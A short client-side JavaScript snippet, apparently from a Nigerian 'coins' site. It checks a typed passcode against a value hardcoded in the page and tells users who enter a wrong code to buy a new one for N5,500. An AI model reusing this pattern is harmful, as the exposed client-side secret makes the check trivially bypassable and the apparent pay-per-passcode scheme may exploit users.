<script>
    function appendToInput(value) {
  const otpInput = document.getElementById('otpInput');
  otpInput.value += value;
}

function clearInput() {
  document.getElementById('otpInput').value = '';
}

function checkOTP() {
  const enteredOTP = document.getElementById('otpInput').value;
  const correctOTP = '64315'; // Replace with your correct OTP

  if (enteredOTP === correctOTP) {
    // Redirect to a success page
    window.location.href = 'https://finaz.com.ng/8/coins.php?user=74471&ref=74471';
  } else {
    // Show error message for incorrect OTP
    alert('Incorrect OTP. Please buy a new one and try again.    The Passcode Amount is N5,500');
    clearInput(); // Optional: Clear the input field for retry

    // Redirect to an error page (you can customize this URL)
    window.location.href = 'index2.html';
  }
}
</script>
